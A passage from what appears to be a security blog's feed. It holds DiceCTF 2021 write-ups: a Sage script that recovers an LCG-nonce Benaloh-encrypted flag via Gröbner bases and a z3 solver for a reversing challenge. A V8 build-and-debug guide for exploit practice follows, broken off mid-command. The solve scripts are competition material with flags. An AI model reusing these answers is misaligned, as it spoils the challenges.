	<span style="color:#66d9ef">return</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(f<span style="color:#e6db74">&#39;{log[pow(z, phi, n)]:x}&#39;</span> <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> data))

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
	<span style="color:#f92672">from</span> local <span style="color:#f92672">import</span> flag
	pk, sk <span style="color:#f92672">=</span> keygen()
	<span style="color:#66d9ef">print</span>(pk)
	<span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> encrypt(flag, pk):
		<span style="color:#66d9ef">print</span>(z)

</code></pre></div><p>The block size is <code>r = 17</code>, we have <code>public key</code> and <code>encrypted flag</code>. But different from the standard <code>Benaloh cryptosystem</code>, the <code>nonce</code> of this challenge is generated with <code>LCG</code>. But we don&rsquo;t know <code>a,u,c</code>.</p>
<p>So what can we do? Focus on the <code>encrypted flag</code>, also called <code>z</code> in this challenge. We can write its expression:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">z_i <span style="color:#f92672">=</span> (y <span style="color:#f92672">**</span> m <span style="color:#f92672">*</span> u_i <span style="color:#f92672">**</span> r) <span style="color:#f92672">%</span> n
u_i <span style="color:#f92672">=</span> (a <span style="color:#f92672">*</span> u_(i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> c) <span style="color:#f92672">%</span> n
</code></pre></div><p>If we have more  <code>z-m pair</code>, then we can construct some multivariate polynomials with unkowned <code>u,a,c</code>, use <a href="https://en.wikipedia.org/wiki/Gr%C3%B6bner_basis">Gröbner basis</a> reduction to help us for finding roots. It also preserves some key properties about the original set. In <code>sagemath</code> the output just like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[c<span style="color:#f92672">^</span><span style="color:#ae81ff">17</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">13458759594676198214694259395597811037811941351192625227467096501437492626016103500732912703741531580440688721418838601356917454469197042860724974820711811807100911025568783389529011375041774037357224005532374737711385620250882965751966936631506501563981475218917679272036145000202705372625367221715684331874911123897488465876418098777295294085721730060353781081936511989823993750197757906274895327225414708735228502620853964519743121169419595741484437884476968407623319417909836503756421684133026872563003628309754191206638310830457160948939228910390136165954060484629537550098482941917500740029457719651678576263154</span>, u <span style="color:#f92672">+</span> <span style="color:#ae81ff">316517663849777910225660080408784696167924695113642531974131497480910378366220174342126802849049539663694903310250609244514828218236832782037217816236893097704270918578097042085736644370848172633750954486260895306171096242584274887827086225061772333809429993942553814439329476648071612609884623299988660650179852653163795008516189222405687351351109996651789580351715791017438004730807486178553378753383208033005732492151858373741617384858699269732745326858016880380595482272818312327147435234514885344494904297204434448240694768364394802707422951925732088102047687537430858233649919876359703515785224783225069089980</span><span style="color:#f92672">*</span>c, a <span style="color:#f92672">+</span> <span style="color:#ae81ff">1661216876440720795949971760316375297223780761108674238540808158213078980164656368815536594328510194746888627111987313473237775055677284466208525500885764198070567384544945702715900113900083864927826969971664844458658182797143288816769247910804809014527517142248172045349023280003970829981831679105885916798790488166987740245714277585192487684558508003531661909679977119963644699703649749483269350109143839889546691324949566145320193582552061487407920959141668364668452895857576184480913586198770372641315376888430566581697787292145901485440997213094118917877437294945649019459331559374549028782748215151722129896006</span>]
</code></pre></div><p>We can use these informations to help us for solving this challenge and finally get the flag.</p>
<h4 id="exp-3">Exp</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># exp.sage</span>
<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span> 

flag_head <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;dice{&#34;</span>
flag_head <span style="color:#f92672">=</span> flag_head<span style="color:#f92672">.</span>hex()

r <span style="color:#f92672">=</span> <span style="color:#ae81ff">17</span>

data <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;output.txt&#34;</span>,<span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>readlines()
(n, y) <span style="color:#f92672">=</span> eval(data[<span style="color:#ae81ff">0</span>])
F <span style="color:#f92672">=</span> Zmod(n)
y <span style="color:#f92672">=</span> F(y)
enc <span style="color:#f92672">=</span> [F(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> data[<span style="color:#ae81ff">1</span>:]]

m <span style="color:#f92672">=</span> dict()
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x10</span>):
    m[y <span style="color:#f92672">^</span> i] <span style="color:#f92672">=</span> i

P<span style="color:#f92672">.&lt;</span>u, a, c<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> PolynomialRing(F)

G <span style="color:#f92672">=</span> []
pol <span style="color:#f92672">=</span> u
<span style="color:#75715e"># z = y ^ m * u ^ r</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(flag_head)):
    g <span style="color:#f92672">=</span> pol <span style="color:#f92672">^</span> r <span style="color:#f92672">-</span> enc[i] <span style="color:#f92672">/</span> y <span style="color:#f92672">^</span> int(flag_head[i],<span style="color:#ae81ff">16</span>)
    G<span style="color:#f92672">.</span>append(g)
    pol <span style="color:#f92672">=</span> a <span style="color:#f92672">*</span> pol <span style="color:#f92672">+</span> c

B <span style="color:#f92672">=</span> Ideal(G)<span style="color:#f92672">.</span>groebner_basis()
<span style="color:#66d9ef">print</span>(B)

flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#75715e"># u = - x * c</span>
<span style="color:#75715e"># c ^ r = - y</span>
<span style="color:#75715e"># z / ( (- x) ^ r * - y) = z / ((u / c) ^ r * c ^ r) = z / (u ^ r)</span>
pol <span style="color:#f92672">=</span> <span style="color:#f92672">-</span> B[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>monomial_coefficient(c) <span style="color:#f92672">*</span> c
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(enc)):
    result <span style="color:#f92672">=</span> enc[i] <span style="color:#f92672">/</span> (pol<span style="color:#f92672">.</span>monomial_coefficient(c) <span style="color:#f92672">^</span> r <span style="color:#f92672">*</span> <span style="color:#f92672">-</span> B[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>constant_coefficient())
    flag <span style="color:#f92672">&lt;&lt;=</span> <span style="color:#ae81ff">4</span>
    flag <span style="color:#f92672">|=</span> m[result]
    pol <span style="color:#f92672">=</span> <span style="color:#f92672">-</span> B[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>constant_coefficient() <span style="color:#f92672">*</span> pol <span style="color:#f92672">+</span> c

flag <span style="color:#f92672">=</span> long_to_bytes(flag)
<span style="color:#66d9ef">print</span>(flag)
<span style="color:#75715e"># dice{gr:obner!_!}</span>
</code></pre></div><h2 id="reverse">Reverse</h2>
<h3 id="babymix">babymix</h3>
<h4 id="analysis-4">Analysis</h4>
<p>Just use z3 to solve it.</p>
<h4 id="exp-4">Exp</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

a2 <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">22</span>):
    a2<span style="color:#f92672">.</span>append(BitVec(<span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">+</span>str(i),<span style="color:#ae81ff">9</span>))
s <span style="color:#f92672">=</span> Solver()
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">153</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">217</span>)
s<span style="color:#f92672">.</span>add((a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">16</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">16</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">232</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">328</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">74</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">166</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">413</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">98</span>)
s<span style="color:#f92672">.</span>add((a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">13</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">12</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">85</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">7</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">77</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">14</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">384</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">265</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">250</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">18</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">75</span>)
s<span style="color:#f92672">.</span>add((a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">16</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">621</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">283</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">11</span>]) <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">14</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">106</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">297</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">156</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">20</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">85</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">17</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">160</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">36</span>)
s<span style="color:#f92672">.</span>add((a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">19</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">16</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">102</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">15</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>)
s<span style="color:#f92672">.</span>add((a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">3</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">4</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">29</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">109</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">361</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">15</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">19</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">296</span>)

s<span style="color:#f92672">.</span>check()
m <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>model()
flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> a2:
    flag <span style="color:#f92672">+=</span> chr(m[i]<span style="color:#f92672">.</span>as_long())
<span style="color:#66d9ef">print</span>(flag)
</code></pre></div><h2 id="references">References</h2>
<p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/medium-rop/#ret2csu">https://ctf-wiki.org/pwn/linux/stackoverflow/medium-rop/#ret2csu</a></p>
<p><a href="https://teamrocketist.github.io/2021/02/08/Pwn-DiceCTF2021-flippidy/">https://teamrocketist.github.io/2021/02/08/Pwn-DiceCTF2021-flippidy/</a></p>
<p><a href="https://www.josephsurin.me/posts/2021-02-08-dicectf-2021-garbled">https://www.josephsurin.me/posts/2021-02-08-dicectf-2021-garbled</a></p>
<p><a href="https://s3v3ru5.github.io/notes/DiceCTF2021#benaloh">https://s3v3ru5.github.io/notes/DiceCTF2021#benaloh</a></p>
<p><a href="https://priv.pub/posts/dicectf-2021/">https://priv.pub/posts/dicectf-2021/</a></p>
]]></content>
        </item>
        
        <item>
            <title>Hello World</title>
            <link>https://vergissmeinnichtz.github.io/posts/helloworld/</link>
            <pubDate>Sun, 07 Feb 2021 00:00:00 +0000</pubDate>
            
            <guid>https://vergissmeinnichtz.github.io/posts/helloworld/</guid>
            <description>Hello World Hope I can keep my dream.</description>
            <content type="html"><![CDATA[<h2 id="hello-world">Hello World</h2>
<p>Hope I can keep my dream.</p>
]]></content>
        </item>
        
        <item>
            <title>How to Build V8</title>
            <link>https://vergissmeinnichtz.github.io/posts/build-v8/</link>
            <pubDate>Sun, 07 Feb 2021 00:00:00 +0000</pubDate>
            
            <guid>https://vergissmeinnichtz.github.io/posts/build-v8/</guid>
            <description>Install depot_tools git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git vim /etc/profile Add `export PATH=$PATH:&amp;#34;/path/to/depot_tools&amp;#34;` to `.profile` cd /depot_tools &amp;amp;&amp;amp; ./gclient Install ninja git clone https://github.com/ninja-build/ninja.git cd ninja &amp;amp;&amp;amp; ./configure.py --bootstrap &amp;amp;&amp;amp; cd .. vim /etc/profile Add `export PATH=$PATH:&amp;#34;/path/to/ninja&amp;#34;` to `.profile` source /etc/profile Download the source code of V8 fetch v8 Patch and compile the debug version cd v8 # git checkout 8.6.358 git reset --hard +hash gclient sync #apply patch git apply &amp;lt; &amp;#34;path/to/tctf.diff&amp;#34; tools/dev/v8gen.</description>
            <content type="html"><![CDATA[<h2 id="install-depot_tools">Install depot_tools</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
vim /etc/profile
Add <span style="color:#e6db74">`</span>export PATH<span style="color:#f92672">=</span>$PATH:<span style="color:#e6db74">&#34;/path/to/depot_tools&#34;</span><span style="color:#e6db74">`</span> to <span style="color:#e6db74">`</span>.profile<span style="color:#e6db74">`</span>
cd /depot_tools <span style="color:#f92672">&amp;&amp;</span> ./gclient
</code></pre></div><h2 id="install-ninja">Install ninja</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/ninja-build/ninja.git
cd ninja <span style="color:#f92672">&amp;&amp;</span> ./configure.py --bootstrap <span style="color:#f92672">&amp;&amp;</span> cd ..
vim /etc/profile
Add <span style="color:#e6db74">`</span>export PATH<span style="color:#f92672">=</span>$PATH:<span style="color:#e6db74">&#34;/path/to/ninja&#34;</span><span style="color:#e6db74">`</span> to <span style="color:#e6db74">`</span>.profile<span style="color:#e6db74">`</span>
source /etc/profile
</code></pre></div><h2 id="download-the-source-code-of-v8">Download the source code of V8</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">fetch v8
</code></pre></div><h2 id="patch-and-compile-the-debug-version">Patch and compile the debug version</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd v8
<span style="color:#75715e"># git checkout 8.6.358</span>
git reset --hard +hash
gclient sync

<span style="color:#75715e">#apply patch</span>
git apply &lt; <span style="color:#e6db74">&#34;path/to/tctf.diff&#34;</span>

tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug
<span style="color:#75715e">#the result is in /out.gn/x64.debug/d8</span>
<span style="color:#75715e">#./tools/dev/gm.py x64.debug</span>
</code></pre></div><h2 id="patch-and-compile-the-release-version">Patch and compile the release version</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tools/dev/v8gen.py x64.release
ninja -C out.gn/x64.release
<span style="color:#75715e">#the result is in /out.gn/x64.release/d8</span>
<span style="color:#75715e"># ./tools/dev/gm.py x64.release</span>
</code></pre></div><h2 id="add-gdb-support">Add gdb support</h2>
<p>Add to <code>~/.gdbinit</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">source /path/to/v8/tools/gdbinit
source /path/to/v8/tools/gdb-v8-support.py
</code></pre></div><h2 id="gdb-init">Gdb init</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb ./d8
pwndbg&gt; set args --allow-natives-syntax ./exp.js
pwndbg&gt; r
</code></pre></div><h2 id="command-job">Command job</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; job 0x2a46080c2b95
